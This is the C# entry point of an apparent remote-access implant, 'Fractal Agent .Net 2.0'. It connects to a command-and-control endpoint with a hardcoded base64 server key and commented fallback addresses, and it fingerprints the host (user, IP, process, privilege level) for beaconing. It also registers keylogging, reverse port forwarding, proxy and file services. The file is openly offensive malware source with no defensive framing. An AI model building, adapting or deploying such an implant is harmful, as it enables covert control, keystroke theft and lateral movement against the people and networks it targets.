using Agent.Communication;
using Agent.Models;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace EntryPoint
{
    public class Entry
    {
#if DEBUG
        static string[] _args = new string[0];
#endif

        public static void Main(string[] args)
        {

#if DEBUG
            System.IO.File.AppendAllText(@"c:\users\olivier\log.txt", "starting!");
#endif

#if DEBUG
            _args = args;
#endif
            try
            {
                Start().Wait();
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine($"Ooops something went wrong : {ex}");
#endif
            }
        }

        public static async Task Start()
        {
            string connUrl = Agent.Properties.Resources.EndPoint;
            string serverKey = Agent.Properties.Resources.Key;
#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));

            //connUrl = "https://192.168.174.128:443";
            //connUrl = "pipe://127.0.0.1:Fractal";
            //connUrl = "http://127.0.0.1:8080";
            //connUrl = "tcp://*:4444";

            if (_args.Count() > 0)
            {
                connUrl = _args[0];
            }

            if (_args.Count() > 1)
            {
                serverKey = _args[1];
            }
            else
            {
                serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
            }

           

#endif
            var connexion = ConnexionUrl.FromString(connUrl);

            Debug.WriteLine($"Endpoint is {connUrl}.");
            Debug.WriteLine($"ServerKey is {serverKey}.");

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString());


            var configService = new ConfigService();
            configService.ServerKey = Convert.FromBase64String(serverKey);
            configService.EncryptFrames = true;

            ServiceProvider.RegisterSingleton<IConfigService>(configService);
            ServiceProvider.RegisterSingleton<INetworkService>(new NetworkService());
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
            var cryptoService = new CryptoService(configService);
            ServiceProvider.RegisterSingleton<ICryptoService>(cryptoService);
            var frameService = new FrameService(cryptoService, configService);
            ServiceProvider.RegisterSingleton<IFrameService>(frameService);
            ServiceProvider.RegisterSingleton<IJobService>(new JobService());
            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService(frameService));
            ServiceProvider.RegisterSingleton<IReversePortForwardService>(new ReversePortForwardService(frameService));

            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());

            //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());

            var commModule = CommunicationFactory.CreateCommunicator(connexion);
            var agent = new Agent.Agent(metaData, commModule);
#if DEBUG
            Debug.WriteLine($"AgentId is {metaData.Id}");
#endif


            var s_agentThread = new Thread(agent.Run);
            s_agentThread.Start();
            s_agentThread.Join();


           

#if DEBUG
            Debug.WriteLine("Bye !");
#endif
        }


        static AgentMetadata GenerateMetadata(string endpoint)
        {
            var hostname = Dns.GetHostName();
            var addresses = Dns.GetHostAddressesAsync(hostname).Result;

            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            var integrity = IntegrityLevel.Medium;
            if (userName == "SYSTEM")
                integrity = IntegrityLevel.System;

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = IntegrityLevel.High;
                }
            }

            AgentMetadata metadata = new AgentMetadata()
            {
                Id = Agent.ShortGuid.NewGuid(),
                Hostname = hostname,
                UserName = userName,
                ProcessId = process.Id,
                Address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).GetAddressBytes(),
                ProcessName = process.ProcessName,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Integrity = integrity,
                EndPoint = endpoint,
                Version = "Fractal Agent .Net 2.0",
                SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                SleepJitter = 0
            };

            return metadata;
        }
    }
}
